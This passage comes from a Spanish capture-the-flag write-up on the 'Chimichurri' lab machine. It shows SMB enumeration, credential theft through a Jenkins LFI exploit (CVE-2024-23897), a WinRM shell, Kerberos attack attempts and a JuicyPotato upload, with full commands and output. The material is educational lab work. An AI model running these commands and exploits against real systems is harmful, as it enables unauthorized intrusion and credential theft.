+</span></span></code></pre></div><p>Comprobamos que existe el <strong>usuario hacker</strong> y también vemos que existe el <strong>usuario invitado</strong>.</p>
+<h4 id="SMBMAP">Enumeración de Servicio SMB con smbmap</h4>
+<p>Probaremos si se puede usar algún usuario para poder listar los recursos compartidos del <strong>servicio SMB</strong> con la herramienta <strong>smbmap</strong>.</p>
+<p>Usemos primero el <strong>usuario hacker</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.1.50 -u <span style="color:#e6db74">&#39;hacker&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>No funciona.</p>
+<p>Ahora usemos el <strong>usuario invitado</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.1.50 -u <span style="color:#e6db74">&#39;invitado&#39;</span>
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.1.50:445       Name: chimichurri.thl           Status: Authenticated
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions     Comment
+</span></span><span style="display:flex;"><span>        ----                                                    -----------     -------
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS       Admin remota
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS       Recurso predeterminado
+</span></span><span style="display:flex;"><span>        drogas                                                  READ ONLY
+</span></span><span style="display:flex;"><span>        IPC$                                                    READ ONLY       IPC remota
+</span></span><span style="display:flex;"><span>        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Excelente, este usuario sí nos sirve para listar los archivos compartidos.</p>
+<p>Ahora podemos listar el recurso <strong>drogas</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.1.50 -u <span style="color:#e6db74">&#39;invitado&#39;</span> -r drogas
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.1.50:445       Name: chimichurri.thl           Status: Authenticated
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions     Comment
+</span></span><span style="display:flex;"><span>        ----                                                    -----------     -------
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS       Admin remota
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS       Recurso predeterminado
+</span></span><span style="display:flex;"><span>        drogas                                                  READ ONLY
+</span></span><span style="display:flex;"><span>        ./drogas
+</span></span><span style="display:flex;"><span>        dr--r--r--                <span style="color:#ae81ff">0</span> Thu Jun <span style="color:#ae81ff">27</span> 04:20:49 <span style="color:#ae81ff">2024</span>    .
+</span></span><span style="display:flex;"><span>        dr--r--r--                <span style="color:#ae81ff">0</span> Thu Jun <span style="color:#ae81ff">27</span> 04:20:49 <span style="color:#ae81ff">2024</span>    ..
+</span></span><span style="display:flex;"><span>        fr--r--r--               <span style="color:#ae81ff">95</span> Sun Jun <span style="color:#ae81ff">30</span> 11:19:02 <span style="color:#ae81ff">2024</span>    credenciales.txt
+</span></span><span style="display:flex;"><span>        IPC$                                                    READ ONLY       IPC remota
+</span></span><span style="display:flex;"><span>        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Genial, lo podemos ver.</p>
+<p>Descarguemos ese archivo (esto es opcional):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.1.50 -u <span style="color:#e6db74">&#39;invitado&#39;</span> --download drogas/credenciales.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting download: drogas<span style="color:#ae81ff">\c</span>redenciales.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">95</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File output to: /../TheHackersLabs/Chimichurri/content/192.168.1.50-drogas_credenciales.txt  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Y ya con esto, podemos continuar.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="JenkinsExploit">Probando Exploit: Jenkins 2.441 - Local File Inclusion y Ganando Acceso a la Máquina</h3>
+<p>Juntando lo que tenemos, parece que la idea es utilizar un Exploit que nos permita ver el archivo que contiene la contraseña del <strong>usuario hacker</strong>, siendo un archivo que se encuentra en su escritorio y que se llama <strong>perico</strong>.</p>
+<p>Regresando con el servidor Jenkins, existe un Exploit que permite aplicar <strong>LFI</strong>:</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/51993" target="_blank">Jenkins 2.441 - Local File Inclusion</a></li>
+</ul>
+<p>El siguiente blog, explica cómo usaron este Exploit:</p>
+<ul>
+<li><a href="https://www.cloudsek.com/blog/xposing-the-exploitation-how-cve-2024-23897-led-to-the-compromise-of-github-repos-via-jenkins-lfi-vulnerability" target="_blank">Exposing the Exploitation: How CVE-2024-23897 Led to the Compromise of Github Repos via Jenkins LFI Vulnerability</a></li>
+</ul>
+<p>Aunque no sea la misma versión para el que está ideado, vamos a probarlo.</p>
+<p>Copiemos el Exploit en nuestro directorio de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -m java/webapps/51993.py
+</span></span><span style="display:flex;"><span>  Exploit: Jenkins 2.441 - Local File Inclusion
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/51993
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/java/webapps/51993.py
+</span></span><span style="display:flex;"><span>    Codes: CVE-2024-23897
+</span></span><span style="display:flex;"><span> Verified: False
+</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable
+</span></span></code></pre></div><p>Parece que está hecho en <strong>Python3</strong>.</p>
+<p>Vamos a ejecutarlo para ver cómo usarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 51993.py -h
+</span></span><span style="display:flex;"><span>usage: 51993.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> -u URL <span style="color:#f92672">[</span>-p PATH<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local File Inclusion exploit <span style="color:#66d9ef">for</span> CVE-2024-23897
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>options:
+</span></span><span style="display:flex;"><span>  -h, --help            show this help message and exit
+</span></span><span style="display:flex;"><span>  -u URL, --url URL     The url of the vulnerable Jenkins service. Ex: http://helloworld.com/
+</span></span><span style="display:flex;"><span>  -p PATH, --path PATH  The absolute path of the file to download
+</span></span></code></pre></div><p>Bien, solamente tenemos que indicar la URL y especificar el path del archivo que queremos ver.</p>
+<p>Intentémoslo de la misma forma como lo hicieron en el blog:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 51993.py -u http://192.168.1.50:6969 -p /Users/hacker/Desktop/perico.txt
+</span></span><span style="display:flex;"><span>hacker:Perico69
+</span></span></code></pre></div><p>Muy bien, funcionó.</p>
+<p>Vamos a comprobar si la contraseña es válida, usando <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.50 -u <span style="color:#e6db74">&#39;hacker&#39;</span> -p <span style="color:#e6db74">&#39;Perico69&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.50   <span style="color:#ae81ff">445</span>    CHIMICHURRI      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:CHIMICHURRI<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:chimichurri.thl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.50   <span style="color:#ae81ff">445</span>    CHIMICHURRI      <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> chimichurri.thl<span style="color:#ae81ff">\h</span>acker:Perico69
+</span></span></code></pre></div><p>Es válida.</p>
+<p>Si recordamos el <strong>escaneo de nmap</strong>, vimos activo el <strong>puerto 5985</strong> que indica que está activo el <strong>servicio WinRM</strong>. Así que vamos a probar si las credenciales sirven para este servicio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec winrm 192.168.1.50 -u <span style="color:#e6db74">&#39;hacker&#39;</span> -p <span style="color:#e6db74">&#39;Perico69&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.1.50   <span style="color:#ae81ff">5985</span>   CHIMICHURRI      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>name:CHIMICHURRI<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:chimichurri.thl<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HTTP        192.168.1.50   <span style="color:#ae81ff">5985</span>   CHIMICHURRI      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> http://192.168.1.50:5985/wsman
+</span></span><span style="display:flex;"><span>WINRM       192.168.1.50   <span style="color:#ae81ff">5985</span>   CHIMICHURRI      <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> chimichurri.thl<span style="color:#ae81ff">\h</span>acker:Perico69 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Genial, entonces podemos usar <strong>evil-winrm</strong> para poder conectarnos a la máquina víctima.</p>
+<p>Probemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 192.168.1.50 -u <span style="color:#e6db74">&#39;hacker&#39;</span> -p <span style="color:#e6db74">&#39;Perico69&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>acker<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>chimichurri0<span style="color:#ae81ff">\h</span>acker
+</span></span></code></pre></div><p>Listo, estamos dentro.</p>
+<p>Lo curioso, es que no podremos ver la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>Access to the path &#39;C:\Users\hacker\Desktop\user.txt&#39; is denied.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ type user.txt
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : PermissionDenied: (C:\Users\hacker\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+</span></span></code></pre></div><p>Quizá podamos verla cuando nos convirtamos en administrador.</p>
+<h3 id="KerberosAttacks">Opcional: Aplicando AS-REP Roasting Attack y Kerberoasting Attack (Ambos Fallan)</h3>
+<p>Esto lo pudimos haber hecho antes, pero era mejor esperarse.</p>
+<p>Lo primero será tratar de ver si era posible aplicar el <strong>AS-REP Roasting Attack</strong>, usando el <strong>usuario hacker</strong> sin su contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetNPUsers chimichurri.thl/hacker -no-pass
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User hacker doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></code></pre></div><p>Pero no funciona.</p>
+<p>Ahora, como ya tenemos su contraseña, podemos intentarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetNPUsers chimichurri.thl/hacker:Perico69
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>No entries found!
+</span></span></code></pre></div><p>Igual no funcionó.</p>
+<p>Por último, podemos probar si podemos aplicar el <strong>Kerberoasting Attack</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetUserSPNs chimichurri.thl/hacker:Perico69
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>No entries found!
+</span></span></code></pre></div><p>Nada tampoco.</p>
+<p>Parece que no podremos hacer más contra el <strong>servicio Kerberos</strong>.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="JuicyPotato">Escalando Privilegios con Juicy Potato</h3>
+<p>Al ver los privilegios de nuestro usuario, podemos ver un privilegio interesante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Desktop&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFORMACIàN DE PRIVILEGIOS
+</span></span><span style="display:flex;"><span>--------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nombre de privilegio          Descripci¢n                                  Estado
+</span></span><span style="display:flex;"><span>============================= ============================================ ==========
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
+</span></span></code></pre></div><p>Parece que no será necesario usar <strong>BloodHound</strong> esta vez.</p>
+<p>Podemos descargar <strong>Juicy Potato</strong> del siguiente link:</p>
+<ul>
+<li><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank">Repositorio de ohpe: Juicy Potato - Releases</a></li>
+</ul>
+<p>Y como ya tenemos una sesión de <strong>evil-winrm</strong>, podemos cargarlo directamente, si lo guardamos en nuestro directorio de trabajo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Desktop&gt; upload JuicyPotato.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /../TheHackersLabs/Chimichurri/content/JuicyPotato.exe to C:\Users\hacker\Desktop\JuicyPotato.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: 463528 bytes of 463528 bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Desktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directorio: C:\Users\hacker\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
